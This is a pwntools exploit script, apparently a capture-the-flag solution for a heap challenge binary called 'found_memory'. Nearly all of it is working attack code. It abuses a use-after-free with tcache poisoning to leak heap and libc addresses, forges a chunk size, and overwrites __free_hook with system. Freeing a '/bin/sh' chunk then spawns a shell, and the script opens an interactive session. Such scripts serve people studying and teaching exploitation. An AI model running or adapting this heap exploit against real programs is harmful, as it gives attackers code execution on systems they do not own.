#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('found_memory')
libc = ELF("./libc.so.6", checksec=False)
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def alloc_chunk():
    io.sendlineafter(b">", b"1")
    io.recvuntil(b"slot ")
    index = io.recvline().strip(b"\x00").strip()
    return int(index)

def free_chunk(idx):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b":", str(idx).encode())

def view_chunk(idx):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b":", str(idx).encode())
    data = io.recvline()
    return data

def edit_chunk(idx, data):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b":", str(idx).encode())
    io.sendafter(b":", data)


def solve():

    """
    We can only allocate 0x30 sized chunk

    So we can't fill up the tcache and expect it to go to the unsorted bin where as it's going to be placed in the fastbin

    But there's a UAF, and we'll leverage that to gain tcache poisoning to the heap inorder to control the size?
    """

    for _ in range(30):
        alloc_chunk()
    
    for i in range(30):
        edit_chunk(i, p64(0) + p64(0x41)) # to bypass check -> !prev_inuse(nextchunk)

    for i in range(2):
        free_chunk(i)
    
    heap_base = u64(view_chunk(1)[1:9]) - 0x2a0
    chunk = heap_base + 0x300

    info("heap base: %#x", heap_base)
    info("target: %#x", chunk)

    edit_chunk(1, p64(chunk))

    alloc_chunk()
    idx = alloc_chunk()

    fake_size = b"A"*(8*3) + p64(0x511)
    edit_chunk(idx, fake_size)

    free_chunk(2)
    main_arena = u64(view_chunk(2)[1:9])
    libc.address = main_arena - 0x1ecbe0
    info("libc base: %#x", libc.address)

    chunkA = alloc_chunk()
    chunkB = alloc_chunk()

    free_chunk(chunkB)
    free_chunk(chunkA)

    edit_chunk(chunkA, p64(libc.sym["__free_hook"]))

    bin_sh = alloc_chunk()
    edit_chunk(bin_sh, b"/bin/sh\x00")

    system = alloc_chunk()
    edit_chunk(system, p64(libc.sym["system"]))

    free_chunk(bin_sh)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

